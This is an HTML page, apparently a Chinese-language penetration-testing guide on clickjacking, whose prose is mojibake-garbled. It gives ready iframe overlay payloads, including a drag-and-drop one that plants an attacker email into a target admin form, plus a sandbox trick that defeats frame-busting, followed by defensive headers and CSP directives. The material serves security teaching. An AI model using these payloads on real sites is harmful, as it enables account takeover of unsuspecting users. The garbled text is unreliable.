<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Clickjacking</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="clickjacking"><a class="header" href="#clickjacking">Clickjacking</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=clickjacking"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ <strong>è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>ï¼Œç”±ä¸–ç•Œä¸Š <strong>æœ€å…ˆè¿›</strong> çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=clickjacking" %}</p>
<h2 id="ä»€ä¹ˆæ˜¯-clickjacking"><a class="header" href="#ä»€ä¹ˆæ˜¯-clickjacking">ä»€ä¹ˆæ˜¯ Clickjacking</a></h2>
<p>åœ¨ clickjacking æ”»å‡»ä¸­ï¼Œ<strong>ç”¨æˆ·</strong>è¢« <strong>æ¬ºéª—</strong> ç‚¹å‡»ç½‘é¡µä¸Šçš„ä¸€ä¸ª <strong>å…ƒç´ </strong>ï¼Œè¯¥å…ƒç´ è¦ä¹ˆæ˜¯ <strong>ä¸å¯è§</strong> çš„ï¼Œè¦ä¹ˆä¼ªè£…æˆå…¶ä»–å…ƒç´ ã€‚è¿™ç§æ“æ§å¯èƒ½å¯¼è‡´ç”¨æˆ·æ„æƒ³ä¸åˆ°çš„åæœï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„è½¯ä»¶ã€é‡å®šå‘åˆ°æ¶æ„ç½‘é¡µã€æä¾›å‡­æ®æˆ–æ•æ„Ÿä¿¡æ¯ã€èµ„é‡‘è½¬ç§»æˆ–åœ¨çº¿è´­ä¹°äº§å“ã€‚</p>
<h3 id="é¢„å¡«å……è¡¨å•æŠ€å·§"><a class="header" href="#é¢„å¡«å……è¡¨å•æŠ€å·§">é¢„å¡«å……è¡¨å•æŠ€å·§</a></h3>
<p>æœ‰æ—¶å¯ä»¥åœ¨åŠ è½½é¡µé¢æ—¶ä½¿ç”¨ GET å‚æ•° <strong>å¡«å……è¡¨å•å­—æ®µçš„å€¼</strong>ã€‚æ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨è¿™ç§è¡Œä¸ºç”¨ä»»æ„æ•°æ®å¡«å……è¡¨å•ï¼Œå¹¶å‘é€ clickjacking æœ‰æ•ˆè½½è·ï¼Œä»¥ä¾¿ç”¨æˆ·ç‚¹å‡»æäº¤æŒ‰é’®ã€‚</p>
<h3 id="ä½¿ç”¨æ‹–æ”¾å¡«å……è¡¨å•"><a class="header" href="#ä½¿ç”¨æ‹–æ”¾å¡«å……è¡¨å•">ä½¿ç”¨æ‹–æ”¾å¡«å……è¡¨å•</a></h3>
<p>å¦‚æœæ‚¨éœ€è¦ç”¨æˆ· <strong>å¡«å†™è¡¨å•</strong>ï¼Œä½†ä¸æƒ³ç›´æ¥è¦æ±‚ä»–å†™ä¸€äº›ç‰¹å®šä¿¡æ¯ï¼ˆä¾‹å¦‚æ‚¨çŸ¥é“çš„ç”µå­é‚®ä»¶æˆ–ç‰¹å®šå¯†ç ï¼‰ï¼Œæ‚¨å¯ä»¥åªè¦æ±‚ä»– <strong>æ‹–æ”¾</strong> ä¸€äº›å°†å†™å…¥æ‚¨æ§åˆ¶æ•°æ®çš„å†…å®¹ï¼Œå¦‚ <a href="https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/"><strong>è¿™ä¸ªä¾‹å­</strong></a>ã€‚</p>
<h3 id="åŸºæœ¬æœ‰æ•ˆè½½è·"><a class="header" href="#åŸºæœ¬æœ‰æ•ˆè½½è·">åŸºæœ¬æœ‰æ•ˆè½½è·</a></h3>
<pre><code class="language-markup">&lt;style&gt;
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
&lt;/style&gt;
&lt;div&gt;Click me&lt;/div&gt;
&lt;iframe src="https://vulnerable.com/email?email=asd@asd.asd"&gt;&lt;/iframe&gt;
</code></pre>
<h3 id="å¤šæ­¥éª¤æœ‰æ•ˆè½½è·"><a class="header" href="#å¤šæ­¥éª¤æœ‰æ•ˆè½½è·">å¤šæ­¥éª¤æœ‰æ•ˆè½½è·</a></h3>
<pre><code class="language-markup">&lt;style&gt;
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
&lt;/style&gt;
&lt;div class="firstClick"&gt;Click me first&lt;/div&gt;
&lt;div class="secondClick"&gt;Click me next&lt;/div&gt;
&lt;iframe src="https://vulnerable.net/account"&gt;&lt;/iframe&gt;
</code></pre>
<h3 id="æ‹–æ”¾--ç‚¹å‡»æœ‰æ•ˆè½½è·"><a class="header" href="#æ‹–æ”¾--ç‚¹å‡»æœ‰æ•ˆè½½è·">æ‹–æ”¾ + ç‚¹å‡»æœ‰æ•ˆè½½è·</a></h3>
<pre><code class="language-markup">&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss"&gt;.&lt;/div&gt;
&lt;div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss"&gt;1. Click and press delete button&lt;/div&gt;
&lt;div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss"&gt;3.Click me&lt;/div&gt;
&lt;iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"&gt;&lt;/iframe&gt;
&lt;div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"&gt;&lt;h3&gt;2.DRAG ME TO THE RED BOX&lt;/h3&gt;&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="xss--clickjacking"><a class="header" href="#xss--clickjacking">XSS + Clickjacking</a></h3>
<p>å¦‚æœæ‚¨å·²è¯†åˆ«å‡ºä¸€ä¸ª<strong>éœ€è¦ç”¨æˆ·ç‚¹å‡»</strong>æŸä¸ªå…ƒç´ ä»¥<strong>è§¦å‘</strong>XSSçš„<strong>XSSæ”»å‡»</strong>ï¼Œå¹¶ä¸”è¯¥é¡µé¢<strong>æ˜“å—ç‚¹å‡»åŠ«æŒ</strong>ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨å®ƒæ¥æ¬ºéª—ç”¨æˆ·ç‚¹å‡»æŒ‰é’®/é“¾æ¥ã€‚<br />
ç¤ºä¾‹ï¼š<br />
&amp;#xNAN;_Youå‘ç°äº†ä¸€ä¸ª<strong>è‡ªæˆ‘XSS</strong>ï¼Œåœ¨è´¦æˆ·çš„ä¸€äº›ç§äººç»†èŠ‚ä¸­ï¼ˆè¿™äº›ç»†èŠ‚<strong>åªæœ‰æ‚¨å¯ä»¥è®¾ç½®å’Œè¯»å–</strong>ï¼‰ã€‚åŒ…å«è®¾ç½®è¿™äº›ç»†èŠ‚çš„<strong>è¡¨å•</strong>çš„é¡µé¢<strong>æ˜“å—</strong> <strong>ç‚¹å‡»åŠ«æŒ</strong>ï¼Œæ‚¨å¯ä»¥ç”¨GETå‚æ•°<strong>é¢„å¡«å……</strong>è¯¥<strong>è¡¨å•</strong>ã€‚<br />
__æ”»å‡»è€…å¯ä»¥å‡†å¤‡ä¸€ä¸ª<strong>ç‚¹å‡»åŠ«æŒ</strong>æ”»å‡»ï¼Œé€šè¿‡<strong>é¢„å¡«å……</strong>è¯¥é¡µé¢çš„<strong>è¡¨å•</strong>ä¸<strong>XSSæœ‰æ•ˆè½½è·</strong>ï¼Œå¹¶<strong>æ¬ºéª—</strong>ç”¨æˆ·<strong>æäº¤</strong>è¡¨å•ã€‚å› æ­¤ï¼Œ<strong>å½“è¡¨å•è¢«æäº¤</strong>ä¸”å€¼è¢«ä¿®æ”¹æ—¶ï¼Œ<strong>ç”¨æˆ·å°†æ‰§è¡ŒXSS</strong>ã€‚</p>
<h2 id="å‡è½»ç‚¹å‡»åŠ«æŒçš„ç­–ç•¥"><a class="header" href="#å‡è½»ç‚¹å‡»åŠ«æŒçš„ç­–ç•¥">å‡è½»ç‚¹å‡»åŠ«æŒçš„ç­–ç•¥</a></h2>
<h3 id="å®¢æˆ·ç«¯é˜²å¾¡"><a class="header" href="#å®¢æˆ·ç«¯é˜²å¾¡">å®¢æˆ·ç«¯é˜²å¾¡</a></h3>
<p>åœ¨å®¢æˆ·ç«¯æ‰§è¡Œçš„è„šæœ¬å¯ä»¥é‡‡å–æªæ–½é˜²æ­¢ç‚¹å‡»åŠ«æŒï¼š</p>
<ul>
<li>ç¡®ä¿åº”ç”¨ç¨‹åºçª—å£æ˜¯ä¸»çª—å£æˆ–é¡¶éƒ¨çª—å£ã€‚</li>
<li>ä½¿æ‰€æœ‰æ¡†æ¶å¯è§ã€‚</li>
<li>é˜²æ­¢å¯¹ä¸å¯è§æ¡†æ¶çš„ç‚¹å‡»ã€‚</li>
<li>æ£€æµ‹å¹¶è­¦å‘Šç”¨æˆ·æ½œåœ¨çš„ç‚¹å‡»åŠ«æŒå°è¯•ã€‚</li>
</ul>
<p>ç„¶è€Œï¼Œè¿™äº›æ¡†æ¶ç ´åè„šæœ¬å¯èƒ½ä¼šè¢«è§„é¿ï¼š</p>
<ul>
<li><strong>æµè§ˆå™¨çš„å®‰å…¨è®¾ç½®ï¼š</strong> ä¸€äº›æµè§ˆå™¨å¯èƒ½ä¼šæ ¹æ®å…¶å®‰å…¨è®¾ç½®æˆ–ç¼ºä¹JavaScriptæ”¯æŒæ¥é˜»æ­¢è¿™äº›è„šæœ¬ã€‚</li>
<li><strong>HTML5 iframe <code>sandbox</code> å±æ€§ï¼š</strong> æ”»å‡»è€…å¯ä»¥é€šè¿‡è®¾ç½®<code>sandbox</code>å±æ€§ä¸º<code>allow-forms</code>æˆ–<code>allow-scripts</code>å€¼è€Œä¸åŒ…å«<code>allow-top-navigation</code>æ¥ä¸­å’Œæ¡†æ¶ç ´åè„šæœ¬ã€‚è¿™ä¼šé˜»æ­¢iframeéªŒè¯å®ƒæ˜¯å¦æ˜¯é¡¶å±‚çª—å£ï¼Œä¾‹å¦‚ï¼Œ</li>
</ul>
<pre><code class="language-html">&lt;iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"&gt;&lt;/iframe&gt;
</code></pre>
<p>The <code>allow-forms</code> å’Œ <code>allow-scripts</code> å€¼åœ¨ç¦ç”¨é¡¶çº§å¯¼èˆªçš„åŒæ—¶å¯ç”¨ iframe å†…çš„æ“ä½œã€‚ä¸ºäº†ç¡®ä¿ç›®æ ‡ç«™ç‚¹çš„é¢„æœŸåŠŸèƒ½ï¼Œå¯èƒ½éœ€è¦é¢å¤–çš„æƒé™ï¼Œå¦‚ <code>allow-same-origin</code> å’Œ <code>allow-modals</code>ï¼Œå…·ä½“å–å†³äºæ”»å‡»ç±»å‹ã€‚æµè§ˆå™¨æ§åˆ¶å°æ¶ˆæ¯å¯ä»¥æŒ‡å¯¼å…è®¸å“ªäº›æƒé™ã€‚</p>
<h3 id="æœåŠ¡å™¨ç«¯é˜²å¾¡"><a class="header" href="#æœåŠ¡å™¨ç«¯é˜²å¾¡">æœåŠ¡å™¨ç«¯é˜²å¾¡</a></h3>
<h4 id="x-frame-options"><a class="header" href="#x-frame-options">X-Frame-Options</a></h4>
<p><strong><code>X-Frame-Options</code> HTTP å“åº”å¤´</strong> é€šçŸ¥æµè§ˆå™¨å…³äºåœ¨ <code>&lt;frame&gt;</code> æˆ– <code>&lt;iframe&gt;</code> ä¸­æ¸²æŸ“é¡µé¢çš„åˆæ³•æ€§ï¼Œæœ‰åŠ©äºé˜²æ­¢ Clickjackingï¼š</p>
<ul>
<li><code>X-Frame-Options: deny</code> - æ²¡æœ‰åŸŸå¯ä»¥æ¡†æ¶å†…å®¹ã€‚</li>
<li><code>X-Frame-Options: sameorigin</code> - åªæœ‰å½“å‰ç«™ç‚¹å¯ä»¥æ¡†æ¶å†…å®¹ã€‚</li>
<li><code>X-Frame-Options: allow-from https://trusted.com</code> - åªæœ‰æŒ‡å®šçš„ 'uri' å¯ä»¥æ¡†æ¶é¡µé¢ã€‚</li>
<li>æ³¨æ„é™åˆ¶ï¼šå¦‚æœæµè§ˆå™¨ä¸æ”¯æŒæ­¤æŒ‡ä»¤ï¼Œå¯èƒ½æ— æ³•å·¥ä½œã€‚ä¸€äº›æµè§ˆå™¨æ›´å€¾å‘äº CSP frame-ancestors æŒ‡ä»¤ã€‚</li>
</ul>
<h4 id="å†…å®¹å®‰å…¨ç­–ç•¥-csp-frame-ancestors-æŒ‡ä»¤"><a class="header" href="#å†…å®¹å®‰å…¨ç­–ç•¥-csp-frame-ancestors-æŒ‡ä»¤">å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) frame-ancestors æŒ‡ä»¤</a></h4>
<p><strong>CSP ä¸­çš„ <code>frame-ancestors</code> æŒ‡ä»¤</strong> æ˜¯é˜²æ­¢ Clickjacking çš„å»ºè®®æ–¹æ³•ï¼š</p>
<ul>
<li><code>frame-ancestors 'none'</code> - ç±»ä¼¼äº <code>X-Frame-Options: deny</code>ã€‚</li>
<li><code>frame-ancestors 'self'</code> - ç±»ä¼¼äº <code>X-Frame-Options: sameorigin</code>ã€‚</li>
<li><code>frame-ancestors trusted.com</code> - ç±»ä¼¼äº <code>X-Frame-Options: allow-from</code>ã€‚</li>
</ul>
<p>ä¾‹å¦‚ï¼Œä»¥ä¸‹ CSP ä»…å…è®¸æ¥è‡ªåŒä¸€åŸŸçš„æ¡†æ¶ï¼š</p>
<p><code>Content-Security-Policy: frame-ancestors 'self';</code></p>
<p>æ›´å¤šè¯¦ç»†ä¿¡æ¯å’Œå¤æ‚ç¤ºä¾‹å¯ä»¥åœ¨ <a href="https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors">frame-ancestors CSP æ–‡æ¡£</a> å’Œ <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors">Mozilla çš„ CSP frame-ancestors æ–‡æ¡£</a> ä¸­æ‰¾åˆ°ã€‚</p>
<h3 id="å†…å®¹å®‰å…¨ç­–ç•¥-csp-ä¸-child-src-å’Œ-frame-src"><a class="header" href="#å†…å®¹å®‰å…¨ç­–ç•¥-csp-ä¸-child-src-å’Œ-frame-src">å†…å®¹å®‰å…¨ç­–ç•¥ (CSP) ä¸ <code>child-src</code> å’Œ <code>frame-src</code></a></h3>
<p><strong>å†…å®¹å®‰å…¨ç­–ç•¥ (CSP)</strong> æ˜¯ä¸€ç§å®‰å…¨æªæ–½ï¼Œé€šè¿‡æŒ‡å®šæµè§ˆå™¨åº”å…è®¸åŠ è½½å†…å®¹çš„æ¥æºï¼Œå¸®åŠ©é˜²æ­¢ Clickjacking å’Œå…¶ä»–ä»£ç æ³¨å…¥æ”»å‡»ã€‚</p>
<h4 id="frame-src-æŒ‡ä»¤"><a class="header" href="#frame-src-æŒ‡ä»¤"><code>frame-src</code> æŒ‡ä»¤</a></h4>
<ul>
<li>å®šä¹‰æ¡†æ¶çš„æœ‰æ•ˆæ¥æºã€‚</li>
<li>æ¯” <code>default-src</code> æŒ‡ä»¤æ›´å…·ä½“ã€‚</li>
</ul>
<pre><code>Content-Security-Policy: frame-src 'self' https://trusted-website.com;
</code></pre>
<p>æ­¤ç­–ç•¥å…è®¸æ¥è‡ªç›¸åŒæºï¼ˆselfï¼‰å’Œ https://trusted-website.com çš„æ¡†æ¶ã€‚</p>
<h4 id="child-src-æŒ‡ä»¤"><a class="header" href="#child-src-æŒ‡ä»¤"><code>child-src</code> æŒ‡ä»¤</a></h4>
<ul>
<li>åœ¨CSPç¬¬2çº§ä¸­å¼•å…¥ï¼Œç”¨äºè®¾ç½®Webå·¥ä½œè€…å’Œæ¡†æ¶çš„æœ‰æ•ˆæºã€‚</li>
<li>ä½œä¸ºframe-srcå’Œworker-srcçš„åå¤‡ã€‚</li>
</ul>
<pre><code>Content-Security-Policy: child-src 'self' https://trusted-website.com;
</code></pre>
<p>æ­¤ç­–ç•¥å…è®¸æ¥è‡ªç›¸åŒæºï¼ˆselfï¼‰å’Œ https://trusted-website.com çš„æ¡†æ¶å’Œå·¥ä½œè€…ã€‚</p>
<p><strong>ä½¿ç”¨è¯´æ˜ï¼š</strong></p>
<ul>
<li>åºŸå¼ƒï¼šchild-src æ­£åœ¨è¢«é€æ­¥æ·˜æ±°ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ frame-src å’Œ worker-srcã€‚</li>
<li>å›é€€è¡Œä¸ºï¼šå¦‚æœ frame-src ç¼ºå¤±ï¼Œåˆ™ä½¿ç”¨ child-src ä½œä¸ºæ¡†æ¶çš„å›é€€ã€‚å¦‚æœä¸¤è€…éƒ½ç¼ºå¤±ï¼Œåˆ™ä½¿ç”¨ default-srcã€‚</li>
<li>ä¸¥æ ¼çš„æºå®šä¹‰ï¼šåœ¨æŒ‡ä»¤ä¸­ä»…åŒ…å«å—ä¿¡ä»»çš„æºï¼Œä»¥é˜²æ­¢è¢«åˆ©ç”¨ã€‚</li>
</ul>
<h4 id="javascript-æ¡†æ¶ç ´åè„šæœ¬"><a class="header" href="#javascript-æ¡†æ¶ç ´åè„šæœ¬">JavaScript æ¡†æ¶ç ´åè„šæœ¬</a></h4>
<p>å°½ç®¡å¹¶éå®Œå…¨å¯é ï¼Œä½†åŸºäº JavaScript çš„æ¡†æ¶ç ´åè„šæœ¬å¯ä»¥ç”¨äºé˜²æ­¢ç½‘é¡µè¢«æ¡†æ¶åŒ–ã€‚ç¤ºä¾‹ï¼š</p>
<pre><code class="language-javascript">if (top !== self) {
top.location = self.location;
}
</code></pre>
<h4 id="ä½¿ç”¨åcsrfä»¤ç‰Œ"><a class="header" href="#ä½¿ç”¨åcsrfä»¤ç‰Œ">ä½¿ç”¨åCSRFä»¤ç‰Œ</a></h4>
<ul>
<li><strong>ä»¤ç‰ŒéªŒè¯ï¼š</strong> åœ¨Webåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨åCSRFä»¤ç‰Œï¼Œä»¥ç¡®ä¿çŠ¶æ€æ›´æ”¹è¯·æ±‚æ˜¯ç”¨æˆ·æœ‰æ„å‘å‡ºçš„ï¼Œè€Œä¸æ˜¯é€šè¿‡Clickjackedé¡µé¢å‘å‡ºçš„ã€‚</li>
</ul>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/clickjacking"><strong>https://portswigger.net/web-security/clickjacking</strong></a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"><strong>https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html</strong></a></li>
</ul>
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=clickjacking"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ<strong>è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹</strong>ï¼Œç”±ä¸–ç•Œä¸Š<strong>æœ€å…ˆè¿›</strong>çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=clickjacking" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æ”»å‡»ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶ï¼ˆARTEï¼‰</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æ”»å‡»ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶ï¼ˆGRTEï¼‰</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒHackTricks</summary>
<ul>
<li>æŸ¥çœ‹<a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discordç¾¤ç»„</strong></a>æˆ–<a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a>ï¼Œæˆ–<strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>å’Œ<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHubåº“æäº¤PRæ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/cache-deception/cache-poisoning-to-dos.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/client-side-template-injection-csti.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
